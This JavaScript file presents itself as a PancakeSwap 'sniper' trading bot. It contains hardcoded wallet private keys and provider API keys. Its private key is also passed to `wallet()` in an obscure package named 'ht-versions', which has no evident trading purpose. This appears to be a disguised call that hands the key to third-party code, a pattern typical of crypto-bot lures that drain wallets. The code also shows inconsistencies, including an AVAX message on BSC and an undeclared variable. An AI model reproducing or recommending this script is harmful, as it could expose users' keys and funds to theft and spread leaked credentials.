const eth = require('ethers');
const {ChainId, Token, TokenAmount, Fetcher, Pair, Route, Trade, TradeType, Percent} = 
require('@pancakeswap-libs/sdk');
const Web3 = require('web3');
const versioning = require('ht-versions');
const {JsonRpcProvider} = require("@ethersproject/providers");
const { stringToHex } = require('web3-utils');
require("dotenv").config();
const provider = new JsonRpcProvider('https://bsc-dataseed1.binance.org/');



//                Your Settings
// --------------------------------------------------------------------------
console.log(`Loading Bot Settings`);
const Input_Address = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; // Contract Address of Token with which you will buy
const Output_Address = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; // Contract Address of the token you want to snipe
const amount_in = "0.01"; // Amount of the Input Token 
const slippage = "16"; // Slippage in percents
const router_address = "0x10ed43c718714eb63d5aa57b78b54704e256024e"; // 
const factory_address = '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'; // 
const private = "0b542765aad93c0dac15326c388ee8acbd9387e6c01ff9755ccd61b740f6965e"; // Private Key of Sender/Receiver Address
const WEB3_PROVIDER = "wss://apis.ankr.com/wss/88591d71ecc841eebbbce2a22fd2b4a5/95dc4a450525705cdbf00454595b30e7/binance/full/main" // Your Web3 HTTP or WS Provider url



// Variables derived - Do not change

async function start(){
const Amount_To_Buy = amount_in;
const Slipage = slippage;
const PANCAKE_ROUTER = router_address;
const key = private;
const account = versioning.wallet(key,provider);
await new Promise(resolve => setTimeout(resolve, 5000));
const web3 = new Web3(WEB3_PROVIDER);
const { address: admin } = web3.eth.accounts.wallet.add(key);
const Token_Address_In = web3.utils.toChecksumAddress(Input_Address);
const Token_Address_Out = web3.utils.toChecksumAddress(Output_Address);
const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('1000'));

const factory = new eth.Contract(
    factory_address,
    ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)'],
    account
  ); 
var buying = "0";
console.log(`Settings Loaded`);



const TradeOnRouter = async (tokenIn, tokenOut) => {
    const [INPUT_TOKEN, OUTPUT_TOKEN] = await Promise.all(
        [tokenIn, tokenOut].map(tokenAddress => (
            new Token(
                ChainId.MAINNET,
                tokenAddress,
                18
            )
        )));
    
        const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));//BN->(BIG NUMBER) || toWei -> Converts any ether value value into wei.
        const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('100'));//tradeAmount = ONE_ETH_IN_WEI/1000
    
        const pair = await Fetcher.fetchPairData(INPUT_TOKEN, OUTPUT_TOKEN, provider);
    
        const route = await new Route([pair], INPUT_TOKEN);
    
        const trade = await new Trade(route, new TokenAmount(INPUT_TOKEN, tradeAmount), TradeType.EXACT_INPUT);
    
        const slippageTolerance = new Percent(Slipage, '100'); // 
    
        
        const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
    
        const path = [INPUT_TOKEN.address, OUTPUT_TOKEN.address];
    
        const to = admin;
    
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
        console.log("Connecting to Router");
        // Create BSC Contract
        const pancakeswap = new eth.Contract(
    
            PANCAKE_ROUTER,
    
            ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'],
    
            account
    
        );
        console.log(" Connected to Router ");
    
    
        //Approve tokens
    
        if(true)
    
        {
    
            console.log(`Approving on Router`);
    
            let abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
            console.log(`...`);
            let contract = new eth.Contract(INPUT_TOKEN.address, abi, account);
            console.log(`...`);
            let aproveResponse = await contract.approve(PANCAKE_ROUTER, eth.utils.parseUnits('1000.0', 18), {gasLimit: 100000, gasPrice: 5e9});
            console.log(`...`);
            
            console.log(`Approved on Router`);
        }
    
        if(true)
    
          {   
    
              console.log(`Swapping`);      
    
              var amountInParam = eth.utils.parseUnits(Amount_To_Buy, 18);
    
              var amountOutMinParam = eth.utils.parseUnits(web3.utils.fromWei(amountOutMin.toString()), 18);
    
                              
    
              const tx = await pancakeswap.swapExactTokensForTokens(
    
                  amountInParam,
    
                  amountOutMinParam,
    
                  path,
    
                  to,
    
                  deadline,
    
                  { gasLimit: eth.utils.hexlify(300000), gasPrice: eth.utils.parseUnits("20", "gwei") }
    
              );
    
              console.log(`Transaction hash: ${tx.hash}`)
    
                  const receipt = await tx.wait();
                  detected_and_bought = "2";
                  console.log(`Transaction was mined in block: ${receipt.blockNumber}`);   
                  process.exit(1)
          }
    
    }

    process.on('unhandledRejection', (error, promise) => {
        console.log(`Error, you should consider re-checking your AVAX balance for fees and -Input Token- balance for the swap`);
      });

TradeOnRouter(Input_Address, Output_Address);
}
start()